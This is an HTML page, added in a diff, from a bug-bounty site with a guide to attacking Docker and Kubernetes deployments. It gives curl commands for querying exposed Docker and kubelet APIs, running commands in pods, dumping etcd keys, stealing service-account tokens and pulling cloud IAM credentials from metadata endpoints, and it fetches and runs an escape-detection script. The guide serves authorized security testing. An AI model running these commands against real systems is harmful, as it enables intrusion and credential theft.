@@ -1,0 +1,854 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- ME1: Dark mode — runs before render to prevent FOUC -->
+    <script>
+      (function() {
+        var saved = localStorage.getItem('theme');
+        if (saved) {
+          document.documentElement.setAttribute('data-theme', saved);
+        } else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+          document.documentElement.setAttribute('data-theme', 'dark');
+          localStorage.setItem('theme', 'dark');
+        }
+      })();
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Test Docker and Kubernetes deployments for container escapes, privilege escalation, and misconfigurations. Practical exploitation techniques with real-world examples.">
+    <title>Docker &amp; Kubernetes Security Testing: Escaping Containers and Exploiting Misconfigs</title>
+    
+    <!-- Canonical URL -->
+    <link rel="canonical" href="https://bughuntertools.com/articles/container-security-testing-bug-bounty-guide-2026/">
+    
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://bughuntertools.com/articles/container-security-testing-bug-bounty-guide-2026/">
+    <meta property="og:title" content="Docker &amp; Kubernetes Security Testing: Escaping Containers and Exploiting Misconfigs">
+    <meta property="og:description" content="Test Docker and Kubernetes deployments for container escapes, privilege escalation, and misconfigurations. Practical exploitation techniques with real-world examples.">
+    <meta property="og:site_name" content="Bug Hunter Tools">
+    
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://bughuntertools.com/articles/container-security-testing-bug-bounty-guide-2026/">
+    <meta name="twitter:title" content="Docker &amp; Kubernetes Security Testing: Escaping Containers and Exploiting Misconfigs">
+    <meta name="twitter:description" content="Test Docker and Kubernetes deployments for container escapes, privilege escalation, and misconfigurations. Practical exploitation techniques with real-world examples.">
+    
+    <!-- Google Fonts: Inter (UI) + JetBrains Mono (code) -->
+    <link rel="stylesheet" href="/css/fonts.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-PP6M3SZSVR"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-PP6M3SZSVR');
+    </script>
+    
+    <!-- AI Agent Referrer Tracking -->
+    <script>
+      (function() {
+        var ua = navigator.userAgent || '';
+        var ref = document.referrer || '';
+        var aiSource = null;
+        
+        // Detect AI agents by User-Agent
+        if (ua.includes('ChatGPT-User') || ua.includes('ChatGPT')) {
+          aiSource = 'chatgpt';
+        } else if (ua.includes('Claude') || ua.includes('Anthropic')) {
+          aiSource = 'claude';
+        } else if (ua.includes('PerplexityBot') || ua.includes('Perplexity')) {
+          aiSource = 'perplexity';
+        } else if (ua.includes('GPTBot')) {
+          aiSource = 'openai_crawler';
+        } else if (ua.includes('ClaudeBot') || ua.includes('anthropic-ai')) {
+          aiSource = 'anthropic_crawler';
+        } else if (ua.includes('Bard') || ua.includes('Gemini')) {
+          aiSource = 'google_gemini';
+        } else if (ref.includes('chat.openai.com')) {
+          aiSource = 'chatgpt_referrer';
+        } else if (ref.includes('claude.ai')) {
+          aiSource = 'claude_referrer';
+        } else if (ref.includes('perplexity.ai')) {
+          aiSource = 'perplexity_referrer';
+        }
+        
+        // Send custom event if AI agent detected
+        if (aiSource) {
+          gtag('event', 'ai_agent_visit', {
+            'ai_source': aiSource,
+            'page_path': window.location.pathname,
+            'user_agent': ua
+          });
+          
+          // Set custom dimension
+          gtag('set', {'ai_visitor': aiSource});
+          
+          // Log to console for debugging
+          console.log('AI Agent detected:', aiSource);
+        }
+      })();
+    </script>
+    
+    <!-- Affiliate Link Click Tracking -->
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+        // Track clicks on Amazon affiliate links (tag=altclaw-20)
+        var links = document.querySelectorAll('a[href*="amazon.com"][href*="altclaw-20"]');
+        links.forEach(function(link) {
+          link.addEventListener('click', function(e) {
+            var href = this.href;
+            var asin = (href.match(/\/dp\/([A-Z0-9]{10})/) || [])[1] || 'unknown';
+            var label = this.textContent.trim().substring(0, 60) || asin;
+            gtag('event', 'affiliate_click', {
+              'event_category': 'affiliate',
+              'event_label': label,
+              'affiliate_product': asin,
+              'affiliate_program': 'amazon',
+              'page_path': window.location.pathname
+            });
+          });
+        });
+      });
+    </script>
+
+    <!-- Google AdSense Verification -->
+    <meta name="google-adsense-account" content="ca-pub-9373816755142401">
+
+    <!-- Google AdSense -->
+    
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9373816755142401" crossorigin="anonymous"></script>
+    
+
+    <!-- Schema.org markup -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "WebPage",
+      "name": "Docker &amp; Kubernetes Security Testing: Escaping Containers and Exploiting Misconfigs",
+      "description": "Test Docker and Kubernetes deployments for container escapes, privilege escalation, and misconfigurations. Practical exploitation techniques with real-world examples.",
+      "url": "https://bughuntertools.com/articles/container-security-testing-bug-bounty-guide-2026/"
+    }
+    </script>
+</head>
+<body>
+    <!-- Sticky Navigation Bar -->
+    <div class="sticky-nav">
+        <div class="container sticky-nav-inner">
+            <a href="/" class="sticky-nav-logo">🔍 Bug Hunter Tools</a>
+            <div class="sticky-nav-links">
+                <a href="/">Home</a>
+                <a href="/articles/">Articles</a>
+                <a href="/categories/">Categories</a>
+                <a href="/demos/">SecurityClaw Demos</a>
+                <a href="/articles/security-testing-tools-2026/">Tools</a>
+                <a href="/about/">About</a>
+                <a href="/privacy.html">Privacy</a>
+            </div>
+            <button class="dark-mode-toggle" aria-label="Toggle dark mode">🌙</button>
+        </div>
+    </div>
+
+    
+    <!-- Breadcrumb Navigation -->
+    <nav class="breadcrumb" aria-label="Breadcrumb">
+        <div class="container">
+            <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <a itemprop="item" href="/">
+                        <span itemprop="name">Home</span>
+                    </a>
+                    <meta itemprop="position" content="1" />
+                </li>
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <a itemprop="item" href="/articles/">
+                        <span itemprop="name">Articles</span>
+                    </a>
+                    <meta itemprop="position" content="2" />
+                </li>
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <span itemprop="name">Docker &amp; Kubernetes Security Testing: Escaping Containers and Exploiting Misconfigs</span>
+                    <meta itemprop="position" content="3" />
+                </li>
+            </ol>
+        </div>
+    </nav>
+    
+
+    
+
+    <main class="container">
+        
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Article",
+  "headline": "Container Security Testing for Bug Bounty in 2026: How to Find and Exploit Docker and Kubernetes Vulnerabilities in Real Targets",
+  "description": "Learn how to find container security vulnerabilities in bug bounty targets. Covers Docker escape, Kubernetes misconfigurations, image vulnerabilities, registry attacks, and real-world exploitation techniques for 2026.",
+  "datePublished": "2026-04-14",
+  "dateModified": "2026-04-14",
+  "author": {
+    "@type": "Organization",
+    "name": "BugHunterTools"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "BugHunterTools",
+    "url": "https://bughuntertools.com"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://bughuntertools.com/articles/container-security-testing-bug-bounty-guide-2026/"
+  }
+}
+</script>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    { "@type": "ListItem", "position": 1, "name": "Home", "item": "https://bughuntertools.com/" },
+    { "@type": "ListItem", "position": 2, "name": "Articles", "item": "https://bughuntertools.com/articles/" },
+    { "@type": "ListItem", "position": 3, "name": "Container Security Testing for Bug Bounty in 2026" }
+  ]
+}
+</script>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "FAQPage",
+  "mainEntity": [
+    {
+      "@type": "Question",
+      "name": "Can you find container vulnerabilities in bug bounty programs?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Yes. Many bug bounty programs include containerized infrastructure in scope. Exposed Docker APIs, misconfigured Kubernetes dashboards, leaked container registry credentials, and container escape vulnerabilities are all valid findings that programs pay for — often at critical severity."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "What tools do you need for container security testing in bug bounty?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Key tools include trivy and grype for image scanning, kubectl and kubeaudit for Kubernetes assessment, deepce for container escape detection, peirates for Kubernetes penetration testing, and standard recon tools like nmap for discovering exposed container services."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "What is the most common container vulnerability in bug bounty?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Exposed Docker daemon APIs (port 2375/2376) and misconfigured Kubernetes dashboards are the most commonly reported container vulnerabilities in bug bounty programs. Both give attackers direct control over the container orchestration layer and typically pay critical bounties."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "How do you detect if a target is running containers?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Look for exposed ports (2375/2376 for Docker, 6443/8443 for Kubernetes API, 10250 for Kubelet), HTTP headers revealing container orchestrators, /.dockerenv files via path traversal, /proc/1/cgroup contents showing container IDs, and Kubernetes-specific endpoints like /api/v1/namespaces."
+      }
+    }
+  ]
+}
+</script>
+
+<section class="key-takeaways">
+<h2>Key Takeaways</h2>
+<ul>
+<li>Container misconfigurations — exposed Docker APIs, open Kubernetes dashboards, privileged containers — are among the highest-paying bug bounty findings in 2026</li>
+<li>Detecting containerized targets requires specific recon: port scanning for 2375/2376/6443/10250, checking HTTP headers, and probing for container metadata endpoints</li>
+<li>Docker escape from privileged containers is a well-documented path to critical severity — if you find a privileged container, you likely have host access</li>
+<li>Kubernetes RBAC misconfigurations are extremely common and often give you lateral movement across the entire cluster</li>
+<li>Container image vulnerabilities (outdated base images, embedded secrets) are valid findings but typically pay less than infrastructure misconfigurations</li>
+</ul>
+</section>
+
+<h2>Why Container Security Matters for Bug Bounty</h2>
+
+<p>Containers are everywhere in 2026. Most bug bounty targets run on Docker and Kubernetes — and most security teams focus their hardening on the application layer, not the container infrastructure underneath it.</p>
+
+<p>That gap is your opportunity. Container misconfigurations routinely pay critical bounties because they give attackers access to the underlying host, the orchestration layer, or the entire cluster. A single exposed Docker API can be more impactful than a dozen XSS findings.</p>
+
+<p>This guide covers the practical techniques for finding and exploiting container vulnerabilities in real bug bounty targets — from initial detection through exploitation and impact demonstration.</p>
+
+<h2>Detecting Containerized Targets</h2>
+
+<p>Before you can test container security, you need to know whether your target runs containers. Here are the signals to look for during recon.</p>
+
+<h3>Port-Based Detection</h3>
+
+<p>Scan for container-specific ports:</p>
+
+<ul>
+<li><strong>2375/tcp</strong> — Docker daemon API (unencrypted)</li>
+<li><strong>2376/tcp</strong> — Docker daemon API (TLS)</li>
+<li><strong>5000/tcp</strong> — Docker Registry</li>
+<li><strong>6443/tcp</strong> — Kubernetes API server</li>
+<li><strong>8443/tcp</strong> — Kubernetes API server (alternate)</li>
+<li><strong>10250/tcp</strong> — Kubelet API</li>
+<li><strong>10255/tcp</strong> — Kubelet read-only API</li>
+<li><strong>2379-2380/tcp</strong> — etcd (Kubernetes backing store)</li>
+<li><strong>30000-32767/tcp</strong> — Kubernetes NodePort range</li>
+</ul>
+
+<pre><code>nmap -sV -p 2375,2376,5000,6443,8443,10250,10255,2379,2380 target.com
+nmap -sV -p 30000-32767 target.com</code></pre>
+
+<h3>HTTP Header Analysis</h3>
+
+<p>Container orchestrators leak information through HTTP headers:</p>
+
+<ul>
+<li><code>Server: openresty</code> or <code>Server: nginx/ingress</code> — likely Kubernetes Ingress</li>
+<li><code>X-Kubernetes-*</code> headers — direct Kubernetes exposure</li>
+<li><code>X-Request-Id</code> with UUID format — common in Kubernetes service meshes</li>
+<li>Istio/Envoy headers (<code>x-envoy-upstream-service-time</code>) — service mesh, confirms Kubernetes</li>
+</ul>
+
+<h3>Application-Level Indicators</h3>
+
+<p>If you have any level of access (SSRF, path traversal, command injection):</p>
+
+<ul>
+<li>Check for <code>/.dockerenv</code> — exists in Docker containers</li>
+<li>Read <code>/proc/1/cgroup</code> — contains container IDs in containerized environments</li>
+<li>Check environment variables — <code>KUBERNETES_SERVICE_HOST</code>, <code>KUBERNETES_PORT</code> confirm Kubernetes pods</li>
+<li>Query <code>http://169.254.169.254/</code> — cloud metadata endpoint, often accessible from containers</li>
+</ul>
+
+<h2>Docker-Specific Attacks</h2>
+
+<h3>Exposed Docker Daemon API</h3>
+
+<p>An exposed Docker daemon API (port 2375) is a critical finding. It gives you full control over all containers on the host and, in most configurations, root access to the host itself.</p>
+
+<p>Test for it:</p>
+
+<pre><code># Check if Docker API is accessible
+curl -s http://target.com:2375/version
+curl -s http://target.com:2375/containers/json
+curl -s http://target.com:2375/images/json</code></pre>
+
+<p>If the API responds, you can list containers, inspect their configurations, read environment variables (which often contain secrets), and in many cases create new containers with host filesystem mounts.</p>
+
+<p><strong>Impact demonstration</strong> (for your report — do NOT actually exploit beyond what's needed to prove impact):</p>
+
+<pre><code># Show you can list running containers and their configs
+curl -s http://target.com:2375/containers/json | jq '.[].Names'
+
+# Show environment variables (may contain API keys, database credentials)
+curl -s http://target.com:2375/containers/&lt;id&gt;/json | jq '.Config.Env'</code></pre>
+
+<h3>Docker Registry Enumeration</h3>
+
+<p>Exposed Docker registries (port 5000) let you pull container images, which often contain embedded secrets, source code, and configuration files.</p>
+
+<pre><code># Check if registry is accessible
+curl -s http://target.com:5000/v2/
+
+# List repositories
+curl -s http://target.com:5000/v2/_catalog
+
+# List tags for a repository
+curl -s http://target.com:5000/v2/&lt;repo&gt;/tags/list
+
+# Get image manifest (contains layer digests)
+curl -s http://target.com:5000/v2/&lt;repo&gt;/manifests/latest</code></pre>
+
+<p>Once you have the manifest, you can pull individual layers and extract them to find secrets, hardcoded credentials, and internal configuration.</p>
+
+<h3>Container Escape from Privileged Containers</h3>
+
+<p>If you gain code execution inside a container (via RCE, SSRF chain, etc.), check whether the container is privileged:</p>
+
+<pre><code># Check if running as privileged
+cat /proc/1/status | grep CapEff
+# CapEff: 0000003fffffffff means fully privileged
+
+# Check for host devices
+ls /dev/ | grep -E "sda|vda|nvme"
+
+# Check cgroup mount
+mount | grep cgroup</code></pre>
+
+<p>A privileged container with <code>CapEff: 0000003fffffffff</code> has all Linux capabilities and can escape to the host. Common escape techniques:</p>
+
+<ul>
+<li><strong>cgroup escape</strong> — mount a cgroup, write a release_agent, trigger it</li>
+<li><strong>Host filesystem mount</strong> — if <code>/dev/sda1</code> is accessible, mount the host disk</li>
+<li><strong>nsenter</strong> — if PID namespace is shared, enter the host's PID 1 namespace</li>
+</ul>
+
+<p>Use <a href="https://github.com/stealthcopter/deepce">deepce</a> to automate container escape detection:</p>
+
+<pre><code># Download and run deepce inside the container
+curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh
+chmod +x deepce.sh
+./deepce.sh</code></pre>
+
+<h3>Docker Socket Mount</h3>
+
+<p>If the Docker socket (<code>/var/run/docker.sock</code>) is mounted inside a container, you have full Docker API access from within the container:</p>
+
+<pre><code># Check for Docker socket
+ls -la /var/run/docker.sock
+
+# If present, interact with Docker API
+curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json</code></pre>
+
+<p>This is equivalent to having the Docker daemon API exposed — it's a critical finding.</p>
+
+<h2>Kubernetes-Specific Attacks</h2>
+
+<h3>Kubernetes API Server</h3>
+
+<p>The Kubernetes API server (port 6443/8443) is the control plane for the entire cluster. If it's accessible without authentication or with weak RBAC:</p>
+
+<pre><code># Check if API server is accessible
+curl -sk https://target.com:6443/api/v1/namespaces
+
+# Check for anonymous access
+curl -sk https://target.com:6443/api/v1/pods
+
+# Check version (less sensitive, often allowed)
+curl -sk https://target.com:6443/version</code></pre>
+
+<h3>Kubelet API</h3>
+
+<p>The Kubelet API (port 10250) runs on every node and can execute commands in pods:</p>
+
+<pre><code># List pods on this node
+curl -sk https://target.com:10250/pods
+
+# If anonymous auth is enabled, you can exec into pods
+curl -sk https://target.com:10250/run/&lt;namespace&gt;/&lt;pod&gt;/&lt;container&gt; -d "cmd=id"</code></pre>
+
+<p>The read-only Kubelet API (port 10255) doesn't allow command execution but leaks pod specifications, environment variables, and mounted secrets:</p>
+
+<pre><code>curl -s http://target.com:10255/pods | jq '.items[].spec.containers[].env'</code></pre>
+
+<h3>Kubernetes Dashboard</h3>
+
+<p>The Kubernetes Dashboard is a web UI for cluster management. When exposed without authentication (or with a skip-login option), it gives full cluster control:</p>
+
+<ul>
+<li>Check common paths: <code>/api/v1/namespaces/kubernetes-dashboard</code>, <code>/dashboard/</code></li>
+<li>Look for the dashboard service on NodePort range (30000-32767)</li>
+<li>Check if the "skip login" button is present</li>
+</ul>
+
+<h3>etcd Exposure</h3>
+
+<p>etcd (ports 2379-2380) is Kubernetes' backing store. It contains all cluster state including secrets:</p>
+
+<pre><code># Check if etcd is accessible
+curl -s http://target.com:2379/version
+
+# List all keys (contains secrets, configs, everything)
+curl -s http://target.com:2379/v3/kv/range -X POST -d '{"key": "AA==", "range_end": "//8="}'</code></pre>
+
+<p>Exposed etcd is always critical — it contains every secret in the cluster in plaintext.</p>
+
+<h3>RBAC Misconfigurations (From Inside a Pod)</h3>
+
+<p>If you have code execution inside a Kubernetes pod, check what the pod's service account can do:</p>
+
+<pre><code># Get the service account token
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+# Set up kubectl with the token
+export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+export API_SERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
+
+# Check what you can do
+curl -sk -H "Authorization: Bearer $TOKEN" $API_SERVER/api/v1/namespaces
+curl -sk -H "Authorization: Bearer $TOKEN" $API_SERVER/api/v1/secrets
+curl -sk -H "Authorization: Bearer $TOKEN" $API_SERVER/apis/rbac.authorization.k8s.io/v1/clusterroles</code></pre>
+
+<p>Common RBAC misconfigurations:</p>
+
+<ul>
+<li><strong>Wildcard permissions</strong> — <code>*</code> on resources or verbs</li>
+<li><strong>cluster-admin bound to default service account</strong> — every pod gets full cluster access</li>
+<li><strong>Secret read access</strong> — service account can read secrets from other namespaces</li>
+<li><strong>Pod create/exec permissions</strong> — can create privileged pods or exec into other pods</li>
+</ul>
+
+<p>Use <a href="https://github.com/inguardians/peirates">peirates</a> for automated Kubernetes penetration testing from inside a pod.</p>
+
+<h2>Container Image Vulnerabilities</h2>
+
+<h3>Scanning Pulled Images</h3>
+
+<p>If you can pull images from an exposed registry, scan them for vulnerabilities and secrets:</p>
+
+<pre><code># Scan with trivy
+trivy image target.com:5000/app:latest
+
+# Scan with grype
+grype target.com:5000/app:latest
+
+# Look for secrets in image layers
+docker save target.com:5000/app:latest | tar -xf -
+# Search extracted layers for secrets
+grep -r "password\|secret\|api_key\|token" */layer.tar</code></pre>
+
+<h3>Common Findings in Container Images</h3>
+
+<ul>
+<li><strong>Hardcoded credentials</strong> in environment variables or config files</li>
+<li><strong>Private keys</strong> baked into the image</li>
+<li><strong>Outdated base images</strong> with known CVEs</li>
+<li><strong>Source code</strong> that wasn't meant to be distributed</li>
+<li><strong>.git directories</strong> left in the image</li>
+<li><strong>Build artifacts</strong> with internal URLs and API endpoints</li>
+</ul>
+
+<h2>Cloud Metadata Attacks from Containers</h2>
+
+<p>Containers running in cloud environments (AWS ECS/EKS, GCP GKE, Azure AKS) can often reach the cloud metadata service:</p>
+
+<pre><code># AWS metadata (IMDSv1)
+curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# AWS ECS task metadata
+curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
+
+# GCP metadata
+curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
+
+# Azure metadata
+curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"</code></pre>
+
+<p>Cloud metadata access from a container often gives you IAM credentials that can be used to access cloud resources outside the container — S3 buckets, databases, other services. This escalates a container compromise to a cloud account compromise.</p>
+
+<h2>Tools for Container Bug Bounty Testing</h2>
+
+<table>
+<thead>
+<tr><th>Tool</th><th>Purpose</th><th>Use Case</th></tr>
+</thead>
+<tbody>
+<tr><td><a href="https://github.com/aquasecurity/trivy">trivy</a></td><td>Image vulnerability scanning</td><td>Scan pulled images for CVEs and secrets</td></tr>
+<tr><td><a href="https://github.com/anchore/grype">grype</a></td><td>Image vulnerability scanning</td><td>Alternative to trivy with different detection engine</td></tr>
+<tr><td><a href="https://github.com/stealthcopter/deepce">deepce</a></td><td>Container escape detection</td><td>Run inside a container to find escape paths</td></tr>
+<tr><td><a href="https://github.com/inguardians/peirates">peirates</a></td><td>Kubernetes penetration testing</td><td>Automated K8s attack from inside a pod</td></tr>
+<tr><td><a href="https://github.com/shopify/kubeaudit">kubeaudit</a></td><td>Kubernetes security audit</td><td>Check for RBAC and config issues</td></tr>
+<tr><td><a href="https://github.com/cyberark/kubeletctl">kubeletctl</a></td><td>Kubelet API interaction</td><td>Enumerate and exploit exposed Kubelet APIs</td></tr>
+<tr><td><a href="https://github.com/cdk-team/CDK">CDK</a></td><td>Container escape toolkit</td><td>Automated container breakout and exploitation</td></tr>
+<tr><td>kubectl</td><td>Kubernetes CLI</td><td>Interact with exposed K8s API servers</td></tr>
+</tbody>
+</table>
+
+<h2>Writing the Bug Bounty Report</h2>
+
+<p>Container findings need clear impact demonstration. Structure your report:</p>
+
+<ol>
+<li><strong>Discovery</strong> — How you found the exposed service (port scan, header analysis, SSRF chain)</li>
+<li><strong>Verification</strong> — What data you could access (list containers, read environment variables, list secrets)</li>
+<li><strong>Impact</strong> — What an attacker could do (host escape, cluster takeover, data exfiltration, lateral movement)</li>
+<li><strong>Remediation</strong> — Specific fixes (disable anonymous auth, restrict network access, fix RBAC, use network policies)</li>
+</ol>
+
+<p><strong>Severity guidelines for container findings:</strong></p>
+
+<ul>
+<li><strong>Critical</strong> — Exposed Docker API, etcd access, Kubelet exec, container escape to host, cluster-admin access</li>
+<li><strong>High</strong> — Exposed registry with secrets in images, RBAC allowing secret reads across namespaces, cloud metadata access with IAM credentials</li>
+<li><strong>Medium</strong> — Read-only Kubelet API, information disclosure via container metadata, outdated images with exploitable CVEs</li>
+<li><strong>Low</strong> — Version disclosure, non-sensitive configuration exposure</li>
+</ul>
+
+<h2>Frequently Asked Questions</h2>
+
+<h3>Can you find container vulnerabilities in bug bounty programs?</h3>
+
+<p>Yes. Many bug bounty programs include containerized infrastructure in scope. Exposed Docker APIs, misconfigured Kubernetes dashboards, leaked container registry credentials, and container escape vulnerabilities are all valid findings that programs pay for — often at critical severity.</p>
+
+<h3>What tools do you need for container security testing in bug bounty?</h3>
+
+<p>Key tools include trivy and grype for image scanning, kubectl and kubeaudit for Kubernetes assessment, deepce for container escape detection, peirates for Kubernetes penetration testing, and standard recon tools like nmap for discovering exposed container services.</p>
+
+<h3>What is the most common container vulnerability in bug bounty?</h3>
+
+<p>Exposed Docker daemon APIs (port 2375/2376) and misconfigured Kubernetes dashboards are the most commonly reported container vulnerabilities in bug bounty programs. Both give attackers direct control over the container orchestration layer and typically pay critical bounties.</p>
+
+<h3>How do you detect if a target is running containers?</h3>
+
+<p>Look for exposed ports (2375/2376 for Docker, 6443/8443 for Kubernetes API, 10250 for Kubelet), HTTP headers revealing container orchestrators, /.dockerenv files via path traversal, /proc/1/cgroup contents showing container IDs, and Kubernetes-specific endpoints like /api/v1/namespaces.</p>
+
+<h2>Related Articles</h2>
+
+<ul>
+<li><a href="/articles/kubernetes-security-testing-bug-bounty-guide-2026/">Kubernetes Security Testing for Bug Bounty in 2026</a></li>
+<li><a href="/articles/cloud-pentesting-methodology-bug-bounty-guide-2026/">Cloud Pentesting Methodology for Bug Bounty in 2026</a></li>
+<li><a href="/articles/serverless-security-testing-bug-bounty-guide-2026/">Serverless Security Testing for Bug Bounty in 2026</a></li>
+<li><a href="/articles/cicd-pipeline-security-testing-bug-bounty-guide-2026/">CI/CD Pipeline Security Testing for Bug Bounty in 2026</a></li>
+<li><a href="/articles/supply-chain-attack-testing-bug-bounty-guide-2026/">Supply Chain Attack Testing for Bug Bounty in 2026</a></li>
+<li><a href="/articles/api-gateway-security-testing-bug-bounty-guide-2026/">API Gateway Security Testing for Bug Bounty in 2026</a></li>
+</ul>
+
+
+        
+        
+        <div class="ad-container ad-below-article">
+            <p class="ad-label">Advertisement</p>
+            <ins class="adsbygoogle"
+                 style="display:block"
+                 data-ad-client="ca-pub-9373816755142401"
+                 data-ad-slot="9879569728"
+                 data-ad-format="auto"
+                 data-full-width-responsive="true"></ins>
+            <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+        </div>
+        
+        
+    </main>
+
+    <footer>
+        <div class="container footer-inner">
+            <span class="footer-updated">Last updated: 16 Apr 2026, 08:48 GMT</span>
+            <p>&copy; 2026 Bug Hunter Tools. All rights reserved. | <a href="/privacy.html" style="color: white;">Privacy Policy</a></p>
+        </div>
+    </footer>
+
+    <!-- ME1: Dark mode toggle handler -->
+    <script>
+      (function() {
+        var btn = document.querySelector('.dark-mode-toggle');
+        if (!btn) return;
+        function updateBtn() {
+          var dark = document.documentElement.getAttribute('data-theme') === 'dark';
+          btn.textContent = dark ? '☀️' : '🌙';
+          btn.setAttribute('aria-label', dark ? 'Switch to light mode' : 'Switch to dark mode');
+        }
+        updateBtn();
+        btn.addEventListener('click', function() {
+          var next = (document.documentElement.getAttribute('data-theme') === 'dark') ? 'light' : 'dark';
+          document.documentElement.setAttribute('data-theme', next);
+          localStorage.setItem('theme', next);
+          updateBtn();
+        });
+      })();
+    </script>
+
+    <!-- ME2: Article hero header + reading time badge -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = path.startsWith('/articles/') && path !== '/articles/';
+        var isDemo    = path.startsWith('/demos/')    && path !== '/demos/';
+        if (!isArticle && !isDemo) return;
+        var article = document.querySelector('article');
+        if (!article) return;
+        var text  = article.innerText || '';
+        var words = text.trim().split(/\s+/).filter(Boolean).length;
+        var mins  = Math.max(1, Math.round(words / 238));
+        var badge = '<span class="reading-time-badge">&#9201; ' + mins + ' min read</span>';
+        var header = article.querySelector('header');
+        if (!header) return;
+        header.classList.add('article-hero-header');
+        var metaEl = header.querySelector('.meta, .article-meta');
+        if (metaEl) {
+          metaEl.classList.add('article-hero-meta');
+          metaEl.insertAdjacentHTML('beforeend', ' &middot; ' + badge);
+        } else {
+          var h1 = header.querySelector('h1');
+          if (h1) {
+            var div = document.createElement('div');
+            div.className = 'article-hero-meta';
+            div.innerHTML = badge;
+            header.appendChild(div);
+          }
+        }
+      })();
+    </script>
+
+    <!-- BR2: Sidebar Table of Contents — IntersectionObserver highlight -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = (path.startsWith('/articles/') && path !== '/articles/') ||
+                        (path.startsWith('/demos/')    && path !== '/demos/');
+        if (!isArticle) return;
+
+        // Build the ToC from headings/sections inside article
+        function buildSidebarToC() {
+          var article = document.querySelector('article');
+          if (!article) return;
+
+          // Collect anchor targets + labels.
+          // Support two patterns:
+          //   (a) <h2 id="..."> / <h3 id="..."> — explicit IDs on headings
+          //   (b) <section id="..."><h2>...</h2> — IDs on parent sections (older articles)
+          var entries = [];
+
+          // Pass (a): headings with own IDs
+          article.querySelectorAll('h2[id], h3[id]').forEach(function(h) {
+            entries.push({ id: h.id, text: h.textContent, level: h.tagName, el: h });
+          });
+
+          // Pass (b): sections with IDs whose h2 has no id yet
+          if (entries.length < 3) {
+            entries = [];
+            article.querySelectorAll('section[id]').forEach(function(sec) {
+              var h = sec.querySelector('h2, h3');
+              if (!h) return;
+              // Ensure heading has the id so IntersectionObserver works
+              if (!h.id) h.id = sec.id;
+              entries.push({ id: h.id, text: h.textContent, level: h.tagName, el: h });
+            });
+          }
+
+          if (entries.length < 3) return; // not worth showing
+
+          // Add has-toc-sidebar class to main
+          var mainEl = document.querySelector('main');
+          if (mainEl) mainEl.classList.add('has-toc-sidebar');
+
+          // Build sidebar element
+          var sidebar = document.createElement('nav');
+          sidebar.className = 'toc-sidebar';
+          sidebar.setAttribute('aria-label', 'Table of contents');
+
+          var header = document.createElement('div');
+          header.className = 'toc-sidebar-header';
+          header.textContent = 'In this article';
+          sidebar.appendChild(header);
+
+          var list = document.createElement('ul');
+          list.className = 'toc-sidebar-list';
+
+          entries.forEach(function(e) {
+            var li = document.createElement('li');
+            li.className = 'toc-sidebar-item' + (e.level === 'H3' ? ' toc-sidebar-item--sub' : '');
+            li.setAttribute('data-heading-id', e.id);
+
+            var a = document.createElement('a');
+            a.href = '#' + e.id;
+            a.textContent = e.text.replace(/^[0-9]+\.\s*/, ''); // strip leading "1. "
+            li.appendChild(a);
+            list.appendChild(li);
+          });
+
+          sidebar.appendChild(list);
+
+          // Append sidebar to main (grid places it to the right)
+          if (mainEl) mainEl.appendChild(sidebar);
+
+          // IntersectionObserver — highlight active heading
+          var items = sidebar.querySelectorAll('.toc-sidebar-item[data-heading-id]');
+          var activeId = null;
+
+          var observer = new IntersectionObserver(function(entries) {
+            entries.forEach(function(entry) {
+              if (entry.isIntersecting) {
+                activeId = entry.target.id;
+              }
+            });
+
+            items.forEach(function(item) {
+              item.classList.toggle(
+                'toc-sidebar-item--active',
+                item.getAttribute('data-heading-id') === activeId
+              );
+            });
+          }, {
+            rootMargin: '-20% 0px -75% 0px',
+            threshold: 0
+          });
+
